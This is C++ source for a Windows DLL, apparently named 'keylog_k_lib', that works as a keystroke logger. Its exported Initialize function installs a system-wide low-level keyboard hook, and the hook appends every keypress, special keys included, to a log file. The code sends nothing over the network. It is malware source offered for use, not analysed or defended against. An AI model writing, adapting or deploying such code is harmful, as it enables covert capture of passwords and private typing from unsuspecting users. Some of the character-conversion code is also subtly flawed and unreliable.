//cl /EHsc /LD .\keylog_k_lib.cpp /link User32.lib
#include <Windows.h>
#include <fstream>
#include <mutex>
#include <codecvt>
#include <string.h>
#define DLL_EXPORT __declspec(dllexport)
///////////////////////////////////////////////////////////////////////
HHOOK keyboardHook;

std::ofstream outputFile;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

///////////////////////////////////////////////////////////////////////

DLL_EXPORT void Initialize(const std::string& filename)
{

    {
        std::lock_guard<std::mutex> lock(logMutex);
        outputFile.open(filename, std::ios::app);
    }

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
}

DLL_EXPORT void Cleanup(const std::string& filename)
{
    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);

    {
        std::lock_guard<std::mutex> lock(logMutex);
        outputFile.close();
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        BYTE keyState[256];
        GetKeyboardState(keyState);
        WCHAR outputChar[2] = { 0 };

        switch (wParam) // Switch on wParam (message type)
        {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN: // Handle system key downs (Alt, etc.)
            {
                
                switch (keyInfo->vkCode)
                {
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        //std::wcout << L"[Shift Pressed] ";
                        outputFile << "[Shift Pressed] ";
                        outputFile.flush();
                        break;
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                        //std::wcout << L"[Control]";
                        outputFile << "[Control]";
                        outputFile.flush();
                        break;
                    case VK_LMENU:
                    case VK_RMENU:
                        //std::wcout << L"[Alt] ";
                        outputFile << "[Alt] ";
                        outputFile.flush();
                        break;
                    case VK_CAPITAL:
                        //std::wcout << L"[Caps Lock] ";
                        outputFile << "[Caps Lock] ";
                        outputFile.flush();
                        break;
                    case VK_BACK:
                        //std::wcout << L"[Backspace]";
                        outputFile << "[Backspace]";
                        outputFile.flush();
                        break;
                    case VK_TAB:
                        //std::wcout << L"[Tab] ";    
                        outputFile << "[Tab] ";
                        outputFile.flush();
                        break;
                    case VK_ESCAPE:
                        //std::wcout << L"[Escape] ";
                        outputFile << "[Escape] ";
                        outputFile.flush();
                        break;
                    case VK_RETURN:
                        //std::wcout << L"[Enter] ";
                        outputFile << "[Enter] ";
                        outputFile.flush();
                        break;
                    case VK_SPACE:
                        //std::wcout << L"[Space]";
                        outputFile << "[Space]";
                        outputFile.flush();
                        break;
                    case VK_LEFT:
                        //std::wcout << L"[<-] ";
                        outputFile << "[<-] ";
                        outputFile.flush();
                        break;
                    case VK_RIGHT:
                        //std::wcout << L"[->] ";
                        outputFile << "[->] ";
                        outputFile.flush();
                        break;
                    case VK_UP:
                        //std::wcout << L"[Up Arrow] ";
                        outputFile << "[Up Arrow] ";
                        outputFile.flush();
                        break;
                    case VK_DOWN:
                        //std::wcout << L"[Down Arrow] ";
                        outputFile << "[Down Arrow] ";
                        outputFile.flush();
                        break;
                    case VK_DELETE:
                        //std::wcout << L"[Del] ";
                        outputFile << "[Del] ";
                        outputFile.flush();
                        break;
                    case VK_INSERT:
                        //std::wcout << L"[Ins] ";
                        outputFile << "[Ins] ";
                        outputFile.flush();
                        break;
                    case VK_LWIN:
                    case VK_RWIN:
                        //std::wcout << L"[Windows] ";
                        outputFile << "[Windows] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD0:
                        //std::wcout << L"[NumPad 0] ";
                        outputFile << "[NumPad 0] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD1:
                        //std::wcout << L"[NumPad 1] ";
                        outputFile << "[NumPad 1] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD2:
                        //std::wcout << L"[NumPad 2] ";
                        outputFile << "[NumPad 2] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD3:
                        //std::wcout << L"[NumPad 3] ";
                        outputFile << "[NumPad 3] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD4:
                        //std::wcout << L"[NumPad 4] ";
                        outputFile << "[NumPad 4] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD5:
                        //std::wcout << L"[NumPad 5] ";
                        outputFile << "[NumPad 5] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD6:
                        //std::wcout << L"[NumPad 6] ";
                        outputFile << "[NumPad 6] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD7:
                        //std::wcout << L"[NumPad 7] ";
                        outputFile << "[NumPad 7] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD8:
                        //std::wcout << L"[NumPad 8] ";
                        outputFile << "[NumPad 8] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMPAD9:
                        //std::wcout << L"[NumPad 9] ";
                        outputFile << "[NumPad 9] "; 
                        outputFile.flush();
                        break;
                    case VK_MULTIPLY:
                        //std::wcout << L"[NumPad Multiply] ";
                        outputFile << "[NumPad Multiply] "; 
                        outputFile.flush();
                        break;
                    case VK_ADD:
                        //std::wcout << L"[NumPad Add] ";
                        outputFile << "[NumPad Add] "; 
                        outputFile.flush();
                        break;
                    case VK_SEPARATOR:
                        //std::wcout << L"[NumPad Separator] ";
                        outputFile << "[NumPad Separator] "; 
                        outputFile.flush();
                        break;
                    case VK_SUBTRACT:
                        //std::wcout << L"[NumPad Subtract] ";
                        outputFile << "[NumPad Subtract] "; 
                        outputFile.flush();
                        break;
                    case VK_DECIMAL:
                        //std::wcout << L"[NumPad Decimal] ";
                        outputFile << "[NumPad Decimal] "; 
                        outputFile.flush();
                        break;
                    case VK_DIVIDE:
                        //std::wcout << L"[NumPad Divide] ";
                        outputFile << "[NumPad Divide] "; 
                        outputFile.flush();
                        break;
                    case VK_HOME:
                        //std::wcout << L"[Home] ";
                        outputFile << "[Home] "; 
                        outputFile.flush();
                        break;
                    case VK_END:
                        //std::wcout << L"[End] ";
                        outputFile << "[End] "; 
                        outputFile.flush();
                        break;
                    case VK_PRIOR:
                        //std::wcout << L"[Pg_up] ";
                        outputFile << "[Pg_up] "; 
                        outputFile.flush();
                        break;
                    case VK_NEXT:
                        //std::wcout << L"[Pg_down] ";
                        outputFile << "[Pg_down] "; 
                        outputFile.flush();
                        break;
                    case VK_NUMLOCK:
                        //std::wcout << L"[Numlock] ";
                        outputFile << "[Numlock] "; 
                        outputFile.flush();
                        break;
                    case VK_SNAPSHOT:
                        //std::wcout << L"[Print_scr] ";
                        outputFile << "[Print_scr] "; 
                        outputFile.flush();
                        break;
                    default:
                    {
                        int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
                        if (result == 1) {
                            //std::wcout << outputChar[0] << L" "; 

                            // Convert wchar_t to UTF-8
                            std::string utf8Char(1, (char)outputChar[0]); 
                            outputFile << utf8Char; 
                        } else if (result > 1) { 
                            outputChar[result] = L'\0';
                            //std::wcout << outputChar << L" "; 

                            // Convert wchar_t string to UTF-8
                            std::string utf8Char = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(outputChar);
                            outputFile << utf8Char; 
                        } else {
                            //std::wcout << L"[unknown] ";
                            outputFile << "[unknown] "; 
                        }
                        outputFile.flush(); 
                        break;
                    }
                }
                break;
            }
            case WM_KEYUP:
            case WM_SYSKEYUP: // Handle system key ups
            {   
                switch (keyInfo->vkCode)
                {
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                    {
                        //std::wcout << L"[Shift Released] ";
                        outputFile << "[Shift Released] ";
                        outputFile.flush();
                        break;
                    }
                }
                break;
            }
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}